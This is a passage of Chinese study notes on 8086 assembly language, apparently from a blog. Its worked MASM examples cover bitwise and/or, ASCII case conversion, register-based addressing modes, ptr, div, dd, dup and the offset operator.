class="line">add bx,2</span><br><span class="line">loop s0;依次出栈8个字型数据到data段的0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="7-更灵活的定位内存地址的方法"><a href="#7-更灵活的定位内存地址的方法" class="headerlink" title="7. 更灵活的定位内存地址的方法"></a>7. 更灵活的定位内存地址的方法</h1><h2 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a>7.1 and和or指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and指令:逻辑与指令，按位进行与运算(1and1=1,1and0=0,0and0=0)</span><br><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br><span class="line">执行后:al=00100011B</span><br><span class="line"></span><br><span class="line">or指令:逻辑或指令，按位进行或运算(1or1=1,1or0=1,0or0=0)</span><br><span class="line">mov al,01100011B</span><br><span class="line">or al,00111011B</span><br><span class="line">执行后:al=01111011B</span><br></pre></td></tr></table></figure><h2 id="7-2-ASCII码"><a href="#7-2-ASCII码" class="headerlink" title="7.2 ASCII码"></a>7.2 ASCII码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a-&gt;61h,b-&gt;62h</span><br></pre></td></tr></table></figure><h2 id="7-3-以字符形式给出的数据"><a href="#7-3-以字符形式给出的数据" class="headerlink" title="7.3 以字符形式给出的数据"></a>7.3 以字符形式给出的数据</h2><p>在汇编程序中，用’’的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;unIX&#x27;</span><br><span class="line">db &#x27;foRK&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:mov al,&#x27;a&#x27;</span><br><span class="line">mov bl,&#x27;b&#x27;</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-4-大小写转换的问题"><a href="#7-4-大小写转换的问题" class="headerlink" title="7.4 大小写转换的问题"></a>7.4 大小写转换的问题</h2><p>在codesg中填写代码，将tadasg中的第一个字符串转化为大写，第二个字符串转化为小写。</p><p><img src="F:\markdown图片\汇编语言\ASCII二进制十六进制.jpg" alt="ASCII二进制十六进制"></p><p>方法一：小写字母的ASCII码值比大写字母的ASCII码值大20H。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,5</span><br><span class="line">s:mov al,[bx]</span><br><span class="line">如果(al)&gt;61H,则为小写字母的ASCII码,则:sub al,20h</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>方法二：大写字母的第6位全为0，小写字母的第6位全为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax;设置ds指向datasg段</span><br><span class="line">mov bx,0;设置(bx)=0,ds:bx指向&#x27;BaSiC&#x27;的第一个字母</span><br><span class="line">mov cx,5</span><br><span class="line">s:mov al,[bx];将ASCII码从ds:bx所指向的单元中取出</span><br><span class="line">and al,11011111B;将al中的ASCII码的第6位置0,变为大写字母</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov bx,5;设置(bx)=5,ds:bx指向&#x27;iNfOrMaTiOn&#x27;的第一个字母</span><br><span class="line">mov cx,11</span><br><span class="line">s0: mov al,[bx]</span><br><span class="line">or al,00100000B</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h2><p>[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata</p><p>mov ax,[bx+200]-&gt;(ax)=((ds)*16+(bx)+200)</p><p>简化7.4方法二(但这个一定要两个字符串长度相同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov bx,0</span><br><span class="line"></span><br><span class="line">    mov cx,5</span><br><span class="line">s:mov al,[bx];定位第一个字符串中的字符</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx],al</span><br><span class="line">mov al,[5+bx];定位第二个字符串中的字符</span><br><span class="line">or al,00100000b</span><br><span class="line">mov [5+bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>[bx]=0[bx]，[5+bx]=5[bx]</p><h2 id="7-6-SI-和-DI"><a href="#7-6-SI-和-DI" class="headerlink" title="7.6 SI 和 DI"></a>7.6 SI 和 DI</h2><p>si 和 di不能够分成两个8位寄存器来使用。</p><p>用ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line"> db &#x27;welcome to masm!&#x27;</span><br><span class="line"> db &#x27;................&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov di,16;复制到它后面的数据区，后面数据区的偏移地址为16</span><br><span class="line"></span><br><span class="line">mov cx,8;一次复制2个字节，一共循环8次</span><br><span class="line">s:mov ax,[si]</span><br><span class="line">mov [di],ax</span><br><span class="line">add si,2</span><br><span class="line">add di,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>利用[bx(si或di)+idata]的方式使程序变简洁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:mov ax,0[si]</span><br><span class="line">mov 16[si],ax</span><br><span class="line">add si,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-7-bx-si-和-bx-di"><a href="#7-7-bx-si-和-bx-di" class="headerlink" title="7.7 [bx+si]和[bx+di]"></a>7.7 [bx+si]和[bx+di]</h2><p>[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)，[bx+di]同。</p><p>mov ax,[bx+si]-&gt;(ax)=((ds)*16+(bx)+(si))</p><p>mov ax,[bx+si]=mov ax,[bx][si]</p><h2 id="7-8-bx-si-idata-和-bx-di-idata"><a href="#7-8-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.8 [bx+si+idata]和[bx+di+idata]"></a>7.8 [bx+si+idata]和[bx+di+idata]</h2><p>[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata，[bx+di+idata]同。</p><p>mov ax,[bx+si+idata]-&gt;(ax)=((ds)*16+(bx)+(si)+idata)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  mov ax,[bx+si+idata]</span><br><span class="line">= mov ax,idata[bx][si]</span><br><span class="line">= mov ax,[bx].idata[si]</span><br><span class="line">= mov ax,[bx][si].idata</span><br></pre></td></tr></table></figure><h2 id="7-9-不同寻址方式的灵活应用"><a href="#7-9-不同寻址方式的灵活应用" class="headerlink" title="7.9 不同寻址方式的灵活应用"></a>7.9 不同寻址方式的灵活应用</h2><p>编程，将datasg段中每个单词首字母改为大写字母(用bx定位每行的起始地址，用3定位要修改的列，用[bx+idata]对目标单元进行寻址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;1..file.........&#x27;;16个字节</span><br><span class="line">db &#x27;2..edit.........&#x27;</span><br><span class="line">db &#x27;3..search.......&#x27;</span><br><span class="line">db &#x27;4..view.........&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start: mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s:  mov al,[bx+3]</span><br><span class="line">and al,11011111b</span><br><span class="line">        mov [bx+3],al</span><br><span class="line">add bx,16</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>编程，将datasg段中每个单词改为大写字母(用bx定位每行的起始地址，用si定位要修改的列，用[bx+si]方式对目标单元进行寻址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov dx,cx;将外层循环的cx值保存在dx中</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,dx;用dx中存放的外层循环的计数值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>如果dx也被用了呢？所有寄存器都被用了呢？可以使用内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">dw 0;定义一个字，用来暂存cx</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov ds:[40h],cx;将外层循环的cx值保存在datasg:40h单元中</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,ds:[40h];用datasg:40h单元中的值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>如果需要保存多个数据，需要记住哪个数据暂存在哪个单元中，这样程序容易混乱。一般来说，在需要暂存数据的时候，我们都应该使用栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">stacksg segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">stacksg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,stacksg</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: push cx;将外层循环的cx值压栈</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">pop cx;从栈顶弹出原cx的值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="8-数据处理"><a href="#8-数据处理" class="headerlink" title="8. 数据处理"></a>8. 数据处理</h1><p>reg表示一个寄存器，sreg表示一个段寄存器。</p><p>reg有ax, bx, cx, dx, ah, al, bh, bl, ch, cl, dh, dl, sp, bp, si, di</p><p>sreg有ds, ss, cs, es</p><h2 id="8-1-bx-si-di和bp"><a href="#8-1-bx-si-di和bp" class="headerlink" title="8.1 bx, si, di和bp"></a>8.1 bx, si, di和bp</h2><ol><li>在8086CPU中又有这4个寄存器可以在“[]”中进行内存单元寻址</li><li>在“[]”中，这4个寄存器可以单个出现，或只能以4种组合出现：bx和si, bx和di, bp和si, bp和di</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bp+di]</span><br></pre></td></tr></table></figure><ol><li>只要在“[]”中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp](ax)=((ss)*16+(bp))</span><br><span class="line">mov ax,[bp+si+idata](ax)=((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></table></figure><h2 id="8-2-数据的位置"><a href="#8-2-数据的位置" class="headerlink" title="8.2 数据的位置"></a>8.2 数据的位置</h2><p>指令在执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口。</p><div class="table-container"><table><thead><tr><th>汇编指令</th><th>指令执行前数据的位置</th></tr></thead><tbody><tr><td>mov bx,[0]</td><td>内存，ds:0单元</td></tr><tr><td>mov bx,ax</td><td>CPU内部，ax寄存器</td></tr><tr><td>mov bx,1</td><td>CPU内部，指令缓冲器</td></tr></tbody></table></div><h3 id="8-2-1-数据位置的表达"><a href="#8-2-1-数据位置的表达" class="headerlink" title="8.2.1 数据位置的表达"></a>8.2.1 数据位置的表达</h3><ol><li>立即数(idata)</li><li>寄存器</li><li>段地址(SA)和偏移地址(EA)</li></ol><h3 id="8-2-2-寻址方式"><a href="#8-2-2-寻址方式" class="headerlink" title="8.2.2 寻址方式"></a>8.2.2 寻址方式</h3><p><img src="F:\markdown图片\汇编语言\寻址方式小结.png" alt="寻址方式小结"></p><h2 id="8-3-数据的长度"><a href="#8-3-数据的长度" class="headerlink" title="8.3 数据的长度"></a>8.3 数据的长度</h2><p>8086CPU可以处理两种尺寸的数据，byte和word。</p><ol><li>通过寄存器名指明要处理的数据的尺寸</li><li>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte</li></ol><p>例如下面的指令中，用word ptr指明了指令访问的内存单元是一个字单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br></pre></td></tr></table></figure><p>下面的指令中，用byte ptr指明了指令访问的内存单元是一个字节单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></table></figure><ol><li>其他方法</li></ol><p>有些指令默认了访问的是字单元还是字节单元，比如push [1000H]就不用指明访问的是字单元还是字节单元。因为push指令只进行字操作。</p><h2 id="8-4-div指令"><a href="#8-4-div指令" class="headerlink" title="8.4 div指令"></a>8.4 div指令</h2><p>div是除法指令，使用div做除法时应注意以下问题</p><ol><li>除数：有8位和16位两种，在一个reg或内存单元中。</li><li>被除数：默认放在AX  或  DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</li><li>结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br><span class="line"></span><br><span class="line">div byte ptr ds:[0]</span><br><span class="line">含义:(al)=(ax)/((ds)*16+0)的商</span><br><span class="line">(ah)=(ax)/((ds)*16+0)的余数</span><br><span class="line"></span><br><span class="line">div word ptr es:[0]</span><br><span class="line">含义:(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商</span><br><span class="line">(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</span><br></pre></td></tr></table></figure><p>编程，利用除法指令计算100001/100</p><p>被除数100001大于65535，不能用ax寄存器存放，所以只能用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法。除数100小于255，可以在一个8位寄存器中存放，但是因为被除数是32位的，除数应为16位，所以要用一个16位寄存器来存放除数100。</p><p>因为要分别为dx和ax赋100001的高16位值和低16位值，所以应先将100001表示为16进制形式：186A1H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx,1</span><br><span class="line">mov ax,86a1h;(dx)*10000H+(ax)=100001h</span><br><span class="line">mov bx,100</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><p>程序执行后，(ax)=03E8H(即1000)，(dx)=1(余数为1)</p><h2 id="8-5-伪指令dd"><a href="#8-5-伪指令dd" class="headerlink" title="8.5 伪指令dd"></a>8.5 伪指令dd</h2><p>dd(double word)双字型数据</p><p>用div计算data段中第一个数据除以第二个数据后的结果，商存在第三个数据的存储单元中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">dd 100001</span><br><span class="line">dw 100</span><br><span class="line">dw 0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,ds:[0];ds:[0]字单元中的低16位存储在ax中</span><br><span class="line">mov dx,ds:[2];ds:[2]字单元中的高16位存储在dx中</span><br><span class="line">div word ptr ds:[4];用dx:ax中的32位数据除以ds:[4]字单元中的数据</span><br><span class="line">mov ds:[6],ax;将商存储在ds:[6]字单元中</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><h2 id="8-6-dup"><a href="#8-6-dup" class="headerlink" title="8.6 dup"></a>8.6 dup</h2><p>dup是一个操作符，在汇编语言中同db, dw, dd等一样，也是由编译器识别处理的符号。它是和db, dw, dd等数据定义伪指令配合使用，用来进行数据的重复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0);定义了3个字节,它们的值都是0,相当于db 0,0,0</span><br><span class="line">db 3 dup (0,1,2);db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)</span><br></pre></td></tr></table></figure><p>dup使用格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 重复的次数 dup (重复的字节型数据)</span><br><span class="line">dw 重复的次数 dup (重复的字型数据)</span><br><span class="line">dd 重复的次数 dup (重复的双字型数据)</span><br></pre></td></tr></table></figure><h1 id="9-转移指令的原理"><a href="#9-转移指令的原理" class="headerlink" title="9. 转移指令的原理"></a>9. 转移指令的原理</h1><p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。转移指令就是可以控制CPU执行内存中某处代码的指令。</p><p>8086CPU的转移行为有以下几类</p><ul><li>只修改IP时，称为段内转移，比如：jmp ax</li><li>同时修改CS和IP时，称为段间转移，比如：jmp 1000:0</li></ul><p>由于转移指令对IP的修改范围不同，段内转移又分为短转移和近转移</p><ul><li>短转移IP的修改范围为-128~127</li><li>近转移IP的修改范围为-32768~32767</li></ul><p>8086CPU的转移指令分为以下几类</p><ul><li>无条件转移指令(jmp)</li><li>条件转移指令</li><li>循环指令(loop)</li><li>过程</li><li>中断</li></ul><h2 id="9-1-操作符offset"><a href="#9-1-操作符offset" class="headerlink" title="9.1 操作符offset"></a>9.1 操作符offset</h2><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset start;相当于mov ax,0(指令长度为3字节)</span><br><span class="line">s:mov ax,offset s;相当于mov ax,3</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>程序在运行中将s处的一条指令复制到s0处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cd:codesg</span><br><span class="line">codesg segment</span><br><span class="line">s:mov ax,bx;mov ax,bx的机器码占两个字节</span><br><span class="line">mov si,offset s</span><br><span class="line">mov di,offset s0</span><br><span class="line">mov ax,cs:[si]</span><br><span class="line">mov cs:[di],ax</span><br><span 